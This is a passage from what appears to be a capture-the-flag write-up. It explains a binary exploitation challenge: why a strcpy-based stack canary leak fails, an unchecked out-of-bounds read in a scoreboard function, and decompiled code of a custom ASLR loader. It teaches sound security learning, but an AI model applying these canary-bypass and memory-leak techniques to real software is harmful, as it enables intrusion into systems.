</div><p>The above example happened due to our example buffer overflow input, where the <code>canary</code> value got replaced with <code>aaaaaaaa</code>. So, how do we usually bypass this? The answer is simple. We need to know the <code>canary</code> value so that we can carefully craft our payload. After that, when we do buffer overflow, we can place the <code>canary</code> value in our payload before our overwritten return pointer, so that when the binary does the <code>canary</code> check, the check will be passed. So, to do this, we need a way to leak the <code>canary</code>.</p>
<p>A common idea to leak it would be to overflow our inputted name until just before the canary (stop at <code>rbp-0x8</code>), so that the <code>canary</code> will be included as part of our name on the scoreboard. To give an illustration, consider this LOC in the <code>game</code> method:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">strcpy</span><span class="p">(</span><span class="n">game_names</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">param_1</span> <span class="o">*</span> <span class="mh">0x20</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above LOC will copy our inputted string to <code>game_names</code> until it found a null terminator <code>\x00</code>. The idea is to overflow our name and stop just before the <code>canary</code> value so that the null terminator <code>\x00</code> detected by <code>strcpy</code> will be null after <code>canary</code> value. Example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Suppose that the stack layout is like below, where:
</span></span><span class="line"><span class="cl">- 0x7fffffffdb10 = address of our input
</span></span><span class="line"><span class="cl">- 0x7fffffffdb38 = our canary value
</span></span><span class="line"><span class="cl">0x7fffffffdb10:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffdb20:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffdb30:	0x0000000000000000	0xdfe0586beeff1337
</span></span><span class="line"><span class="cl">0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">If we overflow our input until 0x7fffffffdb37, the stack will be like below:
</span></span><span class="line"><span class="cl">0x7fffffffdb10:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x7fffffffdb20:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x7fffffffdb30:	0x6161616161616161	0xdfe0586beeff1337
</span></span><span class="line"><span class="cl">0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">And when the strcpy got called, it will copy our name together with the canary,
</span></span><span class="line"><span class="cl">because the null terminator is found in 0x7fffffffdb40
</span></span></code></pre></td></tr></table>
</div>
</div><p>However, notice that <strong>we can&rsquo;t do this</strong> to leak the <code>canary</code>, because this LOC in <code>game</code> method <code>local_20 = local_20 &amp; 0xffffffffffffff;</code>, which is placed just before the <code>strcpy</code> LOC, and it will always set a null terminator (<code>\x00</code>) on <code>0x20</code> from our inputted name address before doing the <code>strcpy</code>. So, even though we can overflow the inputted name, the stored name copied to the scoreboard will be only our first <code>0x1f</code> characters, which implies that the above idea is a pitfall idea. See the illustration below to understand it better:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Suppose that the stack layout is like below, where:
</span></span><span class="line"><span class="cl">- 0x7fffffffdb10 = address of our input
</span></span><span class="line"><span class="cl">- 0x7fffffffdb38 = our canary value
</span></span><span class="line"><span class="cl">0x7fffffffdb10:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffdb20:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x7fffffffdb30:	0x0000000000000000	0xdfe0586beeff1337
</span></span><span class="line"><span class="cl">0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">If we overflow our input until 0x7fffffffdb37,
</span></span><span class="line"><span class="cl">because of the LOC &#34;local_20 = local_20 &amp; 0xffffffffffffff;&#34;
</span></span><span class="line"><span class="cl">the stack will be like below:
</span></span><span class="line"><span class="cl">0x7fffffffdb10:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x7fffffffdb20:	0x6161616161616161	0x0061616161616161
</span></span><span class="line"><span class="cl">0x7fffffffdb30:	0x6161616161616161	0xdfe0586beeff1337
</span></span><span class="line"><span class="cl">0x7fffffffdb40:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">And when the strcpy got called, it won&#39;t copy our name together with the canary,
</span></span><span class="line"><span class="cl">because the null terminator is found in 0x7fffffffdb2f
</span></span></code></pre></td></tr></table>
</div>
</div><p>So let&rsquo;s dive further into the code to find a way to leak the <code>canary</code> value. Let&rsquo;s check another method defined in this object file, especially on the third menu function, which allows us to see the score in the <code>scoreboard[inputted_offset]</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">see_scoreboard</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">cVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">lVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined</span> <span class="n">local_58</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_38</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Which place</span><span class="se">\&#39;</span><span class="s">s score do you want to see (0-9)?&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">cVar1</span> <span class="o">=</span> <span class="n">readline</span><span class="p">(</span><span class="n">local_58</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">cVar1</span> <span class="o">==</span> <span class="sc">&#39;\x01&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">lVar2</span> <span class="o">=</span> <span class="n">atou64</span><span class="p">(</span><span class="n">local_58</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">print</span><span class="p">(</span><span class="s">&#34;To get this place you need to beat this score: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_38</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_30</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_28</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_20</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">u64toa</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">,</span><span class="n">game_scoreboard</span><span class="p">[</span><span class="n">lVar2</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_38</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="cm">/* WARNING: Subroutine does not return */</span>
</span></span><span class="line"><span class="cl">    <span class="n">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that we found our second bug, where we can do out-of-bounds (OOB) read on the scoreboard array. There isn&rsquo;t any bound checking when accessing the <code>game_scoreboard</code> array, which means we can leak any value even though it is placed outside the array. So with this bug, hopefully, we can leak useful value later. Keep in mind that our goal is to leak the <code>canary</code> value.</p>
<h4 id="decompilation-of-loader">Decompilation of loader</h4>
<p>Now we have understood the <code>game.o</code> object file, we still haven&rsquo;t found a way to leak the canary value, so that we can use the buffer overflow bug. Remember the challenge desc:</p>
<blockquote>
<p>I wasn&rsquo;t happy with the default ASLR, so I fixed it.</p>
</blockquote>
<p>Reading through it, it seems like this binary is implementing its own <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank" rel="noopener noreffer ">ASLR</a>. In case you didn&rsquo;t know ASLR, it is a common mitigation technique to make it harder for an attacker to exploit a binary, by setting a random address for the binary function address, stack address, heap, including the used libraries also, so that it will be harder for the attacker to predict the address of each property during crafting their exploit because each new run will have different addresses.</p>
<p>We can deduce that maybe <code>loader</code> file is the one that has the implementation of the custom ASLR as it is the main binary. Let&rsquo;s check how the <code>loader</code> binary works by decompiling it one by one.</p>
<p>Let&rsquo;s start by decompiling the <code>_start</code> method, which is the first entry of the loader.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">_start</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">uVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">sys_getrandom</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rand_state</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">init_stack_guard</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">load_o_phase_1</span><span class="p">(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mh">0x268</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_c</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_c</span> <span class="o">=</span> <span class="n">local_c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_10</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">load_o_phase_2</span><span class="p">(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_10</span> <span class="o">*</span> <span class="mh">0x268</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_10</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_10</span> <span class="o">=</span> <span class="n">local_10</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_14</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">load_o_phase_final</span><span class="p">(</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_14</span> <span class="o">*</span> <span class="mh">0x268</span><span class="p">,</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">files</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">local_14</span> <span class="o">*</span> <span class="mi">8</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_14</span> <span class="o">=</span> <span class="n">local_14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">export_get</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_004031d0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">zeromem</span><span class="p">(</span><span class="n">o_info</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">zeromem</span><span class="p">(</span><span class="n">o_ctx</span><span class="p">,</span><span class="mh">0x9a00</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">zeromem</span><span class="p">(</span><span class="n">export_info</span><span class="p">,</span><span class="mh">0xa00</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">export_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">rand_state</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">pivot_to_main</span><span class="p">(</span><span class="n">uVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After reading through the decompiled codes, seems like this <code>loader</code> will:</p>
<ul>
<li>Initialize random state</li>
<li>Initialize canary stack value</li>
<li>Load the given object files to the loader</li>
<li>Run the main program</li>
</ul>
<p>Let&rsquo;s try to go through it step by step.</p>
<h5 id="initialize-random-state">Initialize Random State</h5>
<p>In this step, the <code>loader</code> will initialize its random state before running the <code>game</code> object file. Let&rsquo;s check the LOC of this step:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">sys_getrandom</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rand_state</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So <code>loader</code> will call <code>sys_getrandom</code>. Let&rsquo;s check it out.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">sys_getrandom</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">,</span><span class="n">undefined8</span> <span class="n">param_2</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param_3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">syscall3</span><span class="p">(</span><span class="mh">0x13e</span><span class="p">,</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">,</span><span class="n">param_3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Oh okay, so turn out, this will call <code>getrandom</code> syscall, and initialize a global variable called <code>rand_state</code> with 8 random bytes.</p>
<h5 id="initialize-canary-stack-value">Initialize canary stack value</h5>
<p>Let&rsquo;s move to the next LOC</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">init_stack_guard</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s check the method decompiled result.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_stack_guard</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined8</span> <span class="n">uVar2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">uVar2</span> <span class="o">=</span> <span class="n">sys_mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">syscall2</span><span class="p">(</span><span class="mh">0x9e</span><span class="p">,</span><span class="mh">0x1002</span><span class="p">,</span><span class="n">uVar2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">write_stack_guard</span><span class="p">(</span><span class="n">iVar1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">write_stack_guard</span><span class="p">(</span><span class="n">undefined8</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">)</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically what this method wants to aim is to generate the <code>canary</code> value from the custom <code>rand()</code> method. Also if you read the assembly, before calling <code>rand()</code>, it set the <code>edi</code> to <code>0x40</code>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/VQQgYIT.png"
        data-srcset="https://i.imgur.com/VQQgYIT.png, https://i.imgur.com/VQQgYIT.png 1.5x, https://i.imgur.com/VQQgYIT.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/VQQgYIT.png"
        title="https://i.imgur.com/VQQgYIT.png" /></p>
<p>Let&rsquo;s check the <code>rand()</code> method to understand better how it generates the canary value.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">rand</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">byte</span> <span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">in_EDI</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">ulong</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">&lt;</span> <span class="n">in_EDI</span><span class="p">;</span> <span class="n">local_14</span> <span class="o">=</span> <span class="n">local_14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">bVar1</span> <span class="o">=</span> <span class="n">rand_get_bit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_10</span> <span class="o">=</span> <span class="n">local_10</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span> <span class="o">|</span> <span class="p">(</span><span class="n">ulong</span><span class="p">)</span><span class="n">bVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
